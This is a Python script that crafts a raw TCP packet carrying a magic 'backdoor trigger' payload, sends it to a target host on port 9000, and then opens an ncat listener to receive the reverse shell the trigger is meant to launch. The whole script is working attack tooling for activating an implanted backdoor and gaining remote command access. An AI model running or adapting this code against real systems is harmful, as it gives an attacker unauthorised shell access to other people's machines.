#!/usr/bin/env python3
import socket
import struct
import sys
import subprocess

def checksum(data):
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

HOST = sys.argv[1]
LISTEN_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5888
PORT = 9000
DATA = b"JOLTEON_PAYLOAD_GET_REVERSE_SHELL" + str(LISTEN_PORT).encode()

# Get the source IP that routes to HOST
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect((HOST, 1))
src_ip = s.getsockname()[0]
s.close()

src_port = 12345
seq_num = 0
ack_num = 0
offset = 5 << 4
flags = 0x18      # PSH + ACK
window = 8192

tcp_header = struct.pack('!HHIIBBHHH',
    src_port, PORT, seq_num, ack_num,
    offset, flags, window, 0, 0)

tcp_len = len(tcp_header) + len(DATA)
pseudo = struct.pack('!4s4sBBH',
    socket.inet_aton(src_ip),
    socket.inet_aton(HOST),
    0, socket.IPPROTO_TCP, tcp_len)

csum = checksum(pseudo + tcp_header + DATA)

tcp_header = struct.pack('!HHIIBBHHH',
    src_port, PORT, seq_num, ack_num,
    offset, flags, window, csum, 0)

print(f"Sending backdoor trigger to {HOST}:{PORT}")

sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
sock.sendto(tcp_header + DATA, (HOST, 0))
print(f"Trigger sent. Waiting for reverse shell on {src_ip}:{LISTEN_PORT}...")
sock.close()

subprocess.run(["ncat", "-lnvp", str(LISTEN_PORT)]) # ncat on macos, nc on linux
